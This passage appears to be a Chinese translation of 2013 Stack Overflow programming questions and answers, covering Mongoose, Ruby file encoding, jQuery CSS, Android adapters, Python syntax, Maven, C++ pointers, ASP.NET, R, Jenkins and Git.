
_id in`ChildSchema`基本上存储在`ParentSchema`.
现在，我的问题是当我在孩子中只有它们的 ObjectId 时，如何获取 ChildSchema 模型中的文档。基本上，如果children = [1, 2, 3, 4[，我如何从ChildSchema 中获取所有带有_id 在[1, 2, 3, 4] 中的记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:59:37.683

实现这一目标的最简单方法是[**填充**](http://mongoosejs.com/docs/populate.html)

例子：

```
ParentSchema = {  
    _id: ObjectID,
    children = [{type: Schema.Types.ObjectId, ref: "ChildModelName"}]
} 

ParentModel.find().populate("children").exec(cb); 
```

# ruby - 编解码程序

> ID：15232890
> 
> 赞同：1
> 
> 时间：2013-03-05T19:54:43.427
> 
> 标签：ruby

我正在使用 ruby​​ 开发一个简单的编码解码程序。编码器工作正常，但是，我无法正确解码文件。它总是返回一个空白文本文件，而不是一个很好解码的文件。这是代码：

编码器，它工作得很好：

```
# Get evil idea and encode
print "Enter your diabolical scheme: " 
$idea = gets
$encode1 = $idea.reverse
$encode2 = $encode1.capitalize

print $encode2
print"
"

#Save the jibberish to a new file
print "
File encoded.  Please enter a name for this idea: " 
idea_name = gets.strip
File::open( "idea-" + idea_name + ".txt", "w" ) do |f|
  f << $encode2
end 
```

还有解码器，完全搞砸了：

```
#Get file to decode
print 'Name of file to decode:'
$name = gets
$file = $name << '.txt'
Dir[$file].each do |file_name|
  $idea = read.File($file)
end

# Print each idea out with the words fixed

$decode1 = $idea.to_s()
$decode2 = $decode1.reverse()
$decode3 = $decode2.capitalize()

print $decode3

#Save decoded file to new location
print "
File decoded.  Please enter a new name for this idea: " 
idea_name = gets.strip
File::open( idea_name + ".txt", "w" ) do |f|
  f << $decode3
end 
```

如何让解码器正确解码文本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:28:48.423

只是给你一个ideomatic ruby​​的例子：

```
# encoder.rb
puts "Enter your diabolical scheme: "

encoded = gets.chomp.reverse.capitalize

puts encoded

puts "File encoded."
puts "Please enter a name for this idea: "
name = gets.chomp

File.open("idea-#{name}.txt", "w" ) do |file|
  file << encoded
end 
```

和解码器

```
# decoder.rb
puts "Name of file to decode:"
name    = gets.chomp
encoded = File.readlines("idea-#{name}.txt").first.chomp

idea = encoded.downcase.reverse
puts "the idea was #{idea}" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:29:01.983

我看到的一个可能的问题是，如果`$file`包含通配符（`*`或`?`），则此代码`$idea`每次通过循环时都会踩踏，导致只有最后一个文件被读取`$idea`：

```
Dir[$file].each do |file_name|
  $idea = read.File($file)
end 
```

相反，您可能希望用`Dir`循环包装所有内容，以便依次处理每个文件。

`$globals`在您知道为什么需要它们之前不要使用它们。随意使用它们表明您不了解变量范围，并且正在使用它们来解决代码中的错误。

我会重写代码看起来更像：

```
# Get evil idea and encode
print 'Enter your diabolical scheme: ' 

encode2 = gets.strip.reverse.capitalize
puts encode2

# Save the jibberish to a new file
print ['', 'File encoded. Please enter a name for this idea: '].join("\n")
idea_name = gets.strip
idea_name += '.txt' unless idea_name[/\.txt$/i]
File.open( "idea-#{ idea_name }", 'w' ) { |fo| fo.puts encode2 } 
```

和：

```
print 'Name of file to decode: '
name = gets.strip
name += '.txt' unless name[/\.txt$/i]

Dir[name].each do |fn|

  idea = File.open(fn, 'r') { |fi| fi.read }

  # Print each idea out with the words fixed
  decode3 = idea.reverse().capitalize()
  puts decode3

  # Save decoded file to new location
  print ['', 'File decoded.  Please enter a new name for this idea: '].join("\n")
  idea_name = gets.strip
  idea_name += '.txt' unless idea_name[/\.txt$/i]
  File::open(idea_name, 'w') { |fo| fo.puts decode3 }

end 
```

我本可以使用`File.read`and `File.write`，但它们都使用“二进制”模式，它不会翻译行尾。出于这个原因，在读取文本文件时最好使用“文本”模式，因为这样 Ruby 可以为正在使用的操作系统做正确的事情。`File.read`返回块返回的值，所以我可以将它分配给一个变量。

我建议不要盲目分配`'.txt'`文件名。相反，请查看是否需要分配它。有时，在打字的热度中，我们忘记了我们*不需要*输入它，然后您会尝试读取或写入带有“.txt.txt”扩展名的文件。

# jquery - 使用 jQuery.css() 方法的 webkit 滚动条

> ID：15232891
> 
> 赞同：0
> 
> 时间：2013-03-05T19:54:43.943
> 
> 标签：jquery, css, webkit, scrollbar

而不是这个： [source_of_example](http://css-tricks.com/custom-scrollbars-in-webkit/)

```
::-webkit-scrollbar {
    width: 12px;
}

::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); 
    border-radius: 10px;
}

::-webkit-scrollbar-thumb {
    border-radius: 10px;
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.5); 
} 
```

我想做这样的事情：

```
var cssObject = {
'::webkit-scrollbar':{
    'width':'12'
},
'::webkit-scrollbar-track':{
    '-webkit-box-shadow':'inset 0 0 6px rgba(0,0,0,0.3)','border-radius':'10'
},
'::webkit-scrollbar-thumb':{
    'border-radius':'10px','-webkit-box-shadow':'inset 0 0 6px rgba(0,0,0,0.5)'
    }
}
$("#container").css(cssObject); 
```

但由于某种原因它不起作用:)，请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:56:13.993

该`.css()`方法将 CSS**属性**应用于元素。

`::webkit-scrollbar-*`是选择伪元素的 CSS**选择器。**
jQuery 没有任何与伪元素交互的方法。

相反，您可以构建自己的样式表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-01T18:09:39.850

`::webkit-scrollbar`使用伪元素创建一个类，并在您想要进行调整时使用 jQuery 添加该类。

**CSS**

```
&.ipad-width::-webkit-scrollbar {
       width: 30px;
} 
```

**jQuery**

```
$('ul.scrolling-ul').addClass('ipad-width'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-04T18:17:39.797

请注意：您确实需要启动全局选择器的使用，否则这些类似乎不起作用。我正在使用

```
::-webkit-scrollbar {
    width: 0px;
}
.scrollbar.overflow::webkit-scrollbar {
    width: 30px;
} 
```

使比通常更宽的滚动条仅在元素溢出时出现。如果没有初始设置，则会出现默认滚动条，并且该类没有任何效果。

# java - 为 CursorAdapter 中的可见视图传递相同的 convertView 实例

> ID：15232895
> 
> 赞同：1
> 
> 时间：2013-03-05T19:54:55.800
> 
> 标签：java, android, listview, simplecursoradapter

我在android中自定义创建的CursorAdapter派生类有一个奇怪的问题：

我的 getView() 实现是在许多网站/谷歌谈话中看到的直接教科书。但是，似乎对于不同的**位置**（调用此方法的位置参数），此方法正在传递相同的**convertView**实例，即使在我看来，这些应该引用不同的对象实例，因为它应该对应于ListView 中的其他可见项，并且不应在可见列表项的情况下重用相同的对象实例...

我已经删除了更新实际视图的实际部分，因为即使没有它，问题也会重现。

```
@Override
    public View getView(int position, View convertView, ViewGroup parent) {
        ViewHolder viewHolder;

        Log.d("dd", "getView()");

        if (convertView == null) {
            Log.d("d", "convertview is null!");

            // create convertView from xml
            convertView = this.mInflater.inflate(R.layout.catalog_entry,
                    parent, false);

            // create the viewHolder
            viewHolder = new ViewHolder();

            viewHolder.name = (TextView) convertView
             .findViewById(R.id.gameName2);
             viewHolder.image = (ImageView) convertView
             .findViewById(R.id.gameImage);

            convertView.setTag(viewHolder);
        } else {
            Log.d("dd", "convertview is not null");
            viewHolder = (ViewHolder) convertView.getTag();
        }

        LinearLayout thisItem = (LinearLayout) convertView;
        Log.d("thisItem",
                "This Item is Index "
                        + position
                        + " "
                        + thisItem.toString()
                        + " "
                        + Integer.toHexString(System.identityHashCode(thisItem))
                        + "x: " + thisItem.getX() + " y: " + thisItem.getY());

        this.cur.moveToPosition((int) (getItemId(position) - 1));

        Log.d("dd", "End of getView()");
        return convertView;
    } 
```

运行此代码会产生以下输出：

> D/dd (27725): getView() D/d (27725): convertview 为空！D/thisItem(27725): This Item is Index 0 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725): getView() D/dd
> (27725): convertview 不为空 D/thisItem(27725): 这个项目是索引 1 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725 ): getView() D/dd
> (27725): convertview is not null D/thisItem(27725): This Item is Index 2 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725)：getView() D/dd
> (27725): convertview 不为空 D/thisItem(27725): 这个项目是索引 3 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D/dd
> (27725): 结束 getView() D/dd (27725 ): getView() D/dd
> (27725): convertview is not null D/thisItem(27725): This Item is Index 4 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725): getView() D/dd
> (27725): convertview is not null D/thisItem(27725): This Item is Index 0 android.widget.LinearLayout@40fb5f70 40fb5f70x: 0.0 y: 0.0 D /dd
> (27725): getView() 结束 D/dd (27725): getView() D/d
> (27725): convertview 为空！D/thisItem(27725): This Item is Index 1 android.widget.LinearLayout@40fb89f8 40fb89f8x: 0.0 y: 0.0 D/dd
> (27725)：getView() D/dd 结束 (27725)：getView() D/d
> (27725)：convertview 为空！D/thisItem(27725): This Item is Index 2 android.widget.LinearLayout@40fb9c48 40fb9c48x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725): getView() D/d
> (27725)：转换视图为空！D/thisItem(27725): This Item is Index 3 android.widget.LinearLayout@40fbae98 40fbae98x: 0.0 y: 0.0 D/dd
> (27725): End of getView() D/dd (27725): getView() D/d
> (27725)：转换视图为空！D/thisItem(27725): This Item is Index 4 android.widget.LinearLayout@40fbc0e8 40fbc0e8x: 0.0 y: 0.0 D/dd
> (27725): End of getView()

从一开始可以看出，对于每个位置（0 到 4），都在发送相同的 View 对象哈希......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T21:34:36.567

简而言之，将您的 ListView 的高度设置为`match_parent`或另一个固定高度。

您看到的ListView 以“试运行”方式调用的原因有很多`getView()`，最常见的原因是您使用`wrap_content`了 ListView 的高度。Android 必须膨胀一堆行来计算 的高度`wrap_content`，但它不能使用真实数据，因为这还不可用。所以适配器抛出了这些*最好的猜测*。稍后，使用实际数据（重新）创建布局，这就是您看到每行创建两次的原因。

CursorAdapter 本身也应该维护适当的行，你不需要这一行：

```
this.cur.moveToPosition((int)(getItemId(position) - 1)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:15:56.837

视图被 重用是正确的`Convertview`。您可以删除所有`Convertview`部分，并确保它不会重复使用不需要的视图，并且您将获得所需的结果（以牺牲一些性能为代价......）。

# python - 将元组传递给 python 类方法

> ID：15232897
> 
> 赞同：3
> 
> 时间：2013-03-05T19:55:03.553
> 
> 标签：python, class, methods, parameters, tuples

我不是真正的 Python 人，但仅仅因为一位书籍作者在 Python 中发布了他们的代码示例，我就不得不处理它。我收到以下代码的语法错误：

```
class SimpleGraph:

    def __init__(self):
        self._spo = {}
        self._pos = {}
        self._osp = {}

    def add(self, (sub, pred, obj)):
        """
        Adds a triple to the graph.
        """
        self._addToIndex(self._spo, sub, pred, obj)
        self._addToIndex(self._pos, pred, obj, sub)
        self._addToIndex(self._osp, obj, sub, pred)
...
... 
```

错误：def add（self，（sub，pred，obj））：^ SyntaxError：无效语法

这是python版本问题还是什么？我似乎无法以这种原始形式将元组传递给类方法。建议表示赞赏。顺便说一句，我刚刚下载了 Python 3.3 编译器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:58:48.913

是的，这是一个 Python 版本问题。Python 3 中不再允许使用元组参数解包语法。请参阅[http://www.python.org/dev/peps/pep-3113/](http://www.python.org/dev/peps/pep-3113/)以获取有关如何操作的说明和示例。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:57:51.167

尝试这样的事情：

```
def add(self, myTup):
    """
    Adds a triple to the graph.
    """
    (sub, pred, obj) = myTup
    self._addToIndex(self._spo, sub, pred, obj)
    self._addToIndex(self._pos, pred, obj, sub)
    self._addToIndex(self._osp, obj, sub, pred) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T19:58:02.240

该代码适用于 python 2.7，但在 3.0 版中不再有效，依此类推...

# python - 如何将一个字符与 Python 中某个字符串中的所有字符进行比较？

> ID：15232898
> 
> 赞同：1
> 
> 时间：2013-03-05T19:55:05.557
> 
> 标签：python, string, list, character, string-comparison

我需要编写一个函数，它将一个字符和一个字符串作为输入，然后将该字符与字符串中的每个元素进行比较。然后它打印并最终返回字符在字符串中出现的次数。

这是我想出的代码，但它的工作方式不正确。如果有人可以解释并纠正错误，我将不胜感激。

我想首先编写一个比较两个字符以检查它们是否相等的函数，如下所示：

```
def func1(x1, x2):
    if x1 == x2:
        return True
    else:
        return False 
```

然后，我想我会像这样写另一个主要功能：

```
def func2():
    ch1 = input("Enter one character. ")
    str1 = str(input("Enter a string. "))
    list_1 = list(str1)
    a = 0
    for 1 in list_1:
        if func1(ch1, list_1):
            a += 1
        else:
            a += 0
        print(a)
        return a 
```

这里有什么错误？如果我选择“a”作为我的字符，然后输入一个由五个 a 组成的字符串作为我的字符串，该函数仍然告诉我“a”只出现在字符串中一次。为什么会这样，我该如何解决？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T20:34:31.167

`"YourString".count("Char")`会做

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T20:16:55.907

几种可能的方法。

使用列表

```
>>> len([x for x in test_string if x == test_char]) 
```

使用 collections.Counter

```
>>> from collections import Counter
>>> print(Counter(test_string)[test_char]) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T20:01:33.547

要解决您眼前的问题，您只需将打印件去除凹痕并返回

```
def func2():
    ch1 = input("Enter one character. ")
    str1 = str(input("Enter a string. "))
    list_1 = list(str1)
    a = 0
    for 1 in list_1:
        if func1(ch1, list_1):
            a += 1
        else:
            a += 0
    print(a)  # <-- dedent
    return a  # <-- dedent 
```

您无需将字符串转换为列表即可对其进行迭代。`else`如果它不做任何事情，则不需要该子句。你不应该从 for 循环内部返回

```
def func2():
    ch1 = input("Enter one character. ")
    str1 = input("Enter a string. ")
    a = 0
    for c in str1:
        if c == ch:
            a += 1
        print(a)
    return a 
```

更简单

```
def func2():
    ch1 = input("Enter one character. ")
    str1 = input("Enter a string. ")
    return str1.count(ch1) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-05T20:03:15.673

这是一个简单的代码，可以满足您的要求：

它返回字符 ch 在文本中出现的次数。

```
def test(ch, text): // ch is character and text is the string
    numAppears = 0
    for t in text:
        if t == ch:
            numAppears += 1
    return numAppears 
```

例子：

```
>>> test("a", "saherbaderahwal")
4
>>> test("c", "hello")
0
>>> test(" ", "nice to meet you")
3
>>> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-05T19:58:08.873

问题是`return`缩进一个块到深，所以在比较列表的第一个字符后，函数返回。

（另一个问题是您的函数`func1`不仅名称不佳，而且过于复杂：

```
def cmp_chars(x, y):
    return x == y 
```

虽然你真的根本不需要一个函数。）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-05T19:58:32.123

假设您放在那里的代码格式正确，取消缩进您的`return`一个块 - 看起来它通过 for 块被调用一次

# maven - Maven编译

> ID：15232903
> 
> 赞同：2
> 
> 时间：2013-03-05T19:55:30.830
> 
> 标签：maven, ant, javac

有人知道 Maven 是如何完成它的编译任务的吗？我知道 Ant 在类路径中查找“tools.jar”并使用“com.sun.tools.javac.Main”作为编译器的入口点。

马文呢？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:45:16.137

只是为了让您知道，在 maven 编译器插件中使用的 javac 编译器（显然，如果您将 'javac' 指定为目标编译器）以这种方式加载：

首先，他尝试从类路径中加载它。如果没有找到编译器，他会尝试从目录“java.home”（系统属性）中的 lib/tools.jar 加载它。就像 ANT 一样，或多或少。

这是来自**org.codehaus.plexus.compiler.javac.JavacCompiler**的片段：

```
private static final String JAVAC_CLASSNAME = "com.sun.tools.javac.Main";
...
...
...
try {
    return JavacCompiler.class.getClassLoader().loadClass( JavacCompiler.JAVAC_CLASSNAME );
} catch ( ClassNotFoundException ex ) {
    // ok
}
final File toolsJar = new File( System.getProperty( "java.home" ), "../lib/tools.jar" );
if ( !toolsJar.exists() ) {
    throw new CompilerException( "tools.jar not found: " + toolsJar );
}
// then, he load the class using a URLClassLoader 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T00:34:15.540

[maven-compiler-plugin](http://maven.apache.org/plugins/maven-compiler-plugin/)对此进行控制，如下所述：-

> **Maven Compiler Plugin** Compiler Plugin 用于编译项目的源代码。默认编译器是 javac，用于编译 Java 源代码。另请注意，目前默认源设置为 1.5，默认目标设置为 1.5，与运行 Maven 的 JDK 无关。如果要更改这些默认值，则应按照[设置 Java 编译器的 -source 和 -target 中所述](http://maven.apache.org/plugins/maven-compiler-plugin/examples/set-compiler-source-and-target.html)设置源和目标。

我希望这可能会有所帮助。

# c++ - 取消引用空指针

> ID：15232905
> 
> 赞同：0
> 
> 时间：2013-03-05T19:55:39.943
> 
> 标签：c++, dereference

我正在尝试用 C++ 编写一个非常简单的指针赋值，如下所示：

```
float  *src;
if(someCondition == true)
    src = somePointer;
else
    src = someOtherPointer; 
```

但是，当我尝试访问 src 时，我收到一条警告说“取消引用空指针（从变量 src 加载）”

另外，如果我尝试像这样为 src 赋予一些初始值：

```
float  *src = aPointer;

if(someCondition == true)
    src = somePointer;
else
    src = someOtherPointer; 
```

我收到一条警告，说分配给 src 的初始值永远不会被读取。尽管这似乎并没有影响我正在尝试做的事情，但我正在努力摆脱所有潜在的问题。这里似乎有什么问题？

任何帮助表示赞赏。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:58:30.967

`somePointer`可能和之一或两者`someOtherPointer`都是 0/NULL

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T20:00:30.820

由于您使用指针而不是引用期望`NULL`是您的指针的可能值。

检查 NULL 可能符合您的兴趣：

```
if(!src) {/*handle null case*/} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:08:48.010

似乎编译器不够聪明，无法意识到它`src`总是会被初始化。尽管 IDK 为什么会假设指针为 NULL，但它更有可能是一些垃圾值。这可以通过使用三元运算符 (?:) 使初始化成为单个语句来解决：

```
float* src = someCondition ? somePointer : someOtherPointer; 
```

编辑：

尝试初始化`src`为 NULL。那应该摆脱初始化警告，我怀疑它会创建一个未使用的值警告。

# asp.net - asp.net 无法访问 formview 控件内登录视图内的更新面板

> ID：15232907
> 
> 赞同：0
> 
> 时间：2013-03-05T19:55:46.330
> 
> 标签：asp.net, controls, updatepanel, formview, loginview

我在updatepanel控件内的loginview中有formview，formview包含一个链接按钮。我必须将链接按钮注册为updatepanel触发器。

```
<asp:UpdatePanel ID="UpdatePanel1" runat="server">
                <ContentTemplate>
                <div id="comments">
                <h6>20 Diyo</h6>
                <div class=" yorumat-div">

                    <asp:LoginView ID="loginYorumAtView" runat="server">
                    <LoggedInTemplate>

                        <asp:FormView ID="frmYorumAt" runat="server" DefaultMode="Insert"  OnItemInserting="frmYorumAt_ItemInserting" DataSourceID="ods_YorumAt" >

                          <InsertItemTemplate>
                              <asp:TextBox ID="txtYorumAt" runat="server" CssClass="yorumat-txtbox" TextMode="MultiLine"  Text='<%# Bind("Yorum_Text") %>'></asp:TextBox>
                              <asp:LinkButton ID="btnYorumAt" runat="server" CssClass="yorumat-button" CommandName="Insert" >Yolla</asp:LinkButton>
                              <asp:TextBoxWatermarkExtender ID="TextBoxWatermarkExtender1" runat="server" TargetControlID="txtYorumAt" WatermarkText=" Yorum At ....">
                              </asp:TextBoxWatermarkExtender>
                              <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" ErrorMessage="RequiredFieldValidator" Display="None" ControlToValidate="txtYorumAt"></asp:RequiredFieldValidator>
                          </InsertItemTemplate>
                        </asp:FormView>

                    </LoggedInTemplate>
                    </asp:LoginView>

                    <asp:ObjectDataSource ID="ods_YorumAt" runat="server" InsertMethod="YorumEkle" 
                        TypeName="yonet" DataObjectTypeName="Yorum" 
                        oninserting="ods_YorumAt_Inserting" >
                       <InsertParameters>
                       <asp:QueryStringParameter DbType="Int32" Name="comment_post_idy" />
                       </InsertParameters>

                    </asp:ObjectDataSource>

                   </div>
                    <ul class="commentlist" >
                    <asp:DataList ID="datalistYorum" runat="server" DataSourceID="ods_yorumlar" ItemStyle-CssClass="commentlist" RepeatLayout="Table">

                       <ItemTemplate>

                        <li class="comment">

                        <div class="comment-body">
                                                   ............<%# Eval("comment")%>... 
                        </div>

                        </li>
                        </ItemTemplate>
                        </asp:DataList>
                       <asp:ObjectDataSource ID="ods_yorumlar" runat="server" 
                            DataObjectTypeName="Yorum" TypeName="yonet" SelectMethod="PostYorumlariGetir" 
                            ondatabinding="ods_yorumlar_DataBinding" onselecting="ods_yorumlar_Selecting">
                       <SelectParameters>
                       <asp:QueryStringParameter Name="comment_post_id" QueryStringField="post_id" Type="Int32" DefaultValue="2" />
                       </SelectParameters>
                       </asp:ObjectDataSource>

                </ContentTemplate>
                <Triggers>

                </Triggers>
                </asp:UpdatePanel> 
```

和后面的代码

```
 protected void Page_Load(object sender, EventArgs e)
        {

            //LinkButton btnYorumAt = loginYorumAtView.FindControl("frmYorumAt").FindControl("btnYorumAt") as LinkButton;

            FormView frmYorumAt = (FormView)loginYorumAtView.FindControl("frmYorumAt");
            LinkButton btnYorumAt = (LinkButton)frmYorumAt.FindControl("btnYorumAt");
            ScriptManager.GetCurrent(Page).RegisterAsyncPostBackControl(btnYorumAt);
       } 
```

错误：使用新关键字创建对象实例很快无法访问链接按钮请帮助我谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:13:19.177

由于 FormView 使用绑定数据时填充的模板，因此您只能像这样抓住 DataBound 事件的控件：

```
protected void Page_Load(object sender, EventArgs e)
{
    FormView frmYorumAt = (FormView)loginYorumAtView.FindControl("frmYorumAt");

    frmYorumAt.DataBound += new EventHandler(frmYorumAt_DataBound);
}

void frmYorumAt_DataBound(object sender, EventArgs e)
{
    FormView formView = sender as FormView;

    // Let's make sure the InsertItemTemplate is actually being run, otherwise 
    // the LinkButton won't exist. 
    if (formView.CurrentMode == FormViewMode.Insert)  
    {
        LinkButton btnYorumAt = (LinkButton)formView .FindControl("btnYorumAt");

        // Do whatever you need to do with the LinkButton here.
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:14:48.820

这可以通过上一个问题来回答：

[asp.net findcontrol方法返回null](https://stackoverflow.com/questions/13696770/asp-net-findcontrol-method-return-null)

您是否尝试在 Page_load 事件中访问它？

# r - R中的手动数组创建

> ID：15232910
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:55:55.287
> 
> 标签：r

我想知道在计划中获取二维点坐标数组的最直接方法是什么：

*   2 点位于 (0,1) 和 (0,-1)
*   200 个点位于 x 上的 [-1,1] 段上

我正在处理函数，但我觉得一些 R-fu 会很容易

编辑：

对于信息，我最终这样做了，但必须有更好的方法......

```
x <- function(){
    z <- list()
    for (i in (0 : 200)){
        z[i] <- i/100 - 1
    }
    z[201] <- 0
    z[202] <- 0
    z
}

y <- function(){
    z <- list()
    for (i in (0 : 200)){
        z[i] <- 0 * (i/100 - 1) # 0 is to 'tilt' the segment
    }
    z[201] <- -1
    z[202] <- 1
    z
}

dgk <- data.frame(x = as.numeric(x()),
                  y = as.numeric(y())) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T20:00:00.757

我不完全清楚你的要求，但怎么样：

```
ptcoords = cbind(x=c(0,0,runif(200,-1,1)), y=c(-1,1,rep(0,200)))
plot(ptcoords) 
```

?

您还可以使用 seq(-1,1,length=200) 递增地覆盖 -1 到 1，而不是使用 runif()。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T22:46:24.260

```
dgk <- data.frame(x = c(seq(-.99, 1, .01), 0, 0), y = c(rep(0, 200), -1, 1)) 
```

这符合您想要的输出。看来您只需要熟悉`seq`and `rep`。

编辑：然而，这可能更接近你真正想要的

```
x <- c(seq(-1, 1, length.out = 200), 0, 0)
y <- c(rep(0, 200), -1, 1)
dgk <- data.frame(x, y) 
```

我把它分成几个步骤来更容易地说明发生了什么。

# jquery - 水平等间距未知数量的图像

> ID：15232911
> 
> 赞同：0
> 
> 时间：2013-03-05T19:56:03.363
> 
> 标签：jquery, equals, centering

不管添加了多少点，我希望它们在一条线上等距分布，而不是超过线的宽度。这是我到目前为止所拥有的，在添加太多图像之前可以正常工作，然后它们就会过去。

```
var count = $('#dots img').length;
var dotW = $('.dot').width();
var line = $('#line').width();

var x = count * dotW;
var y = line - x;
var z = y / (count + 1);

$('.dot').css('margin-left', z); 
```

查看jsfiddle。 [http://jsfiddle.net/kirkr/2L9eg/](http://jsfiddle.net/kirkr/2L9eg/) 复制并粘贴图像标签以测试更多。

我错过了什么？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:02:38.873

您的问题是图像之间的空白。使用这个 CSS：

```
#dots {
    font-size: 0;
} 
```

它工作正常。

**编辑：**

玩了一下。如果需要，您可以用图像替换 div。请务必从图像中删除尽可能多的空白。

[http://jsfiddle.net/2L9eg/6/](http://jsfiddle.net/2L9eg/6/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:01:21.300

您的计算很好，是 HTML 中的空白导致空间超出预期。

[这是`img`标签](http://jsfiddle.net/2L9eg/3/)之间没有空格的版本。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-05T20:00:11.817

只需在页面加载每个“点”后应用具有所需属性（可能是边距）的 css 类。IE：

```
$(document).ready(function() {
    $(".dot").css("margin-right","10px");
}); 
```

# ruby - Ruby 应用程序中的无状态服务和每次都创建新实例

> ID：15232913
> 
> 赞同：1
> 
> 时间：2013-03-05T19:56:05.607
> 
> 标签：ruby, service

我来自基于无状态服务的系统很流行的 Java 世界。在 Ruby 世界中它不是那么受欢迎，我找不到任何答案，如何做到这一点。

假设我需要 CRUD 服务来存储订单。它是纯无状态的，没有实例变量，只有 , 等方法`create`。`read`我想知道每次我想使用它时是否应该创建它的新实例？在带有 Spring 或 Guice 的 java 中，您有一个可以同时使用的实例。

我可以想到以下方法来实现它

1）普通班，`OrderRepository.new`每次都打电话

```
 class OrderRepository
    def create(order)
       ..
    end
  end 
```

2）类方法和调用`OrderRepository.create`（听起来不太好）

```
 class OrderRepository
    def self.create(order)
       ..
    end
  end 
```

3）模块而不是类

在这种情况下，哪一个更可取？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:40:23.863

在你的情况下，我会使用类级别的方法。意见可能会有所不同，但如果您实际上并不需要实例化某事物的实例，我认为没有任何意义。如果您不需要，或者如果一个不适合您的目标，我也不认为添加像单例这样的 gem 或添加框架有任何意义。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-05T20:11:01.770

Java 领域中有很多模式没有映射到像 ruby​​ 这样的动态语言。尽管有一整本关于 ruby​​ 中的设计模式的书（[http://www.amazon.com/Design-Patterns-Ruby-Russ-Olsen/dp/0321490452](https://rads.stackoverflow.com/amzn/click/com/0321490452)），但其中大部分都没用。

当您谈论 CRUD 时，您可能正在谈论可用于管理某些数据库实体的 HTTP 口语 API。

在 ruby​​ 领域，您可能会使用 rails 来做这些事情，因为它对构建 RESTfull 应用程序和 JSON api 有很好的支持。

所以，请不要在 ruby​​ 中创建 DAO 或 Repository 类。只是没有必要（大多数时候）。

# jquery - 类型错误：属性“$”

> ID：15232917
> 
> 赞同：0
> 
> 时间：2013-03-05T19:56:17.860
> 
> 标签：jquery, debugging, quicksand

我的 jQuery 出现错误。

```
Uncaught TypeError: Property '$' of object [object Object] is not a function jquery.custom.js:19

portfolio_quicksand jquery.custom.js:19
(anonymous function) jquery.custom.js:71
l jquery.js:2
c.fireWith jquery.js:2
v.extend.ready jquery.js:2
A jquery.js:2 
```

这是 javascript 的第 19 行。我觉得很好。任何想法都会很棒！$filter = $('.filter li.active a').attr('class');

我正在调用 jQuery，如下所示...

```
 jQuery(document).ready(function() {
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:17:07.523

你能试试这个吗`jQuery(document).ready(function($) { //your code here });`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:04:42.383

尝试 ：

$(document).ready(function(){...})

$ 只是 jQuery(document).ready(function() {} 的捷径

您确定在您的自定义脚本（第 19 行）中使用 jQuery 或 Java 吗？

# git - 配置 Jenkins 和 Git/GitHub

> ID：15232920
> 
> 赞同：3
> 
> 时间：2013-03-05T19:56:31.400
> 
> 标签：git, github, jenkins

这是我第一次尝试使用 Jenkins，我已经将它安装在 Windows 2008 R2 上。我还安装了“Jenkins GIT 插件”以及“GitHub 插件”。下面你会看到我通过项目设置组合在一起的图像（尝试连接到 GitHub 存储库），蓝色中断下方是 Jenkins 的 Git 设置。谁能告诉我红色错误信息是什么意思？看起来命令不正确-路径中缺少可执行文件的事实似乎很奇怪，但这可能是我的无知。

在 Git Bash 中运行“ssh git@github.com”会成功返回，所以我的 ssh 密钥似乎安装正确（我这里没有处理身份验证错误）。

![在此处输入图像描述](../Images/01047e0ed44951d5d1a9faca7972761d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-30T05:48:33.040

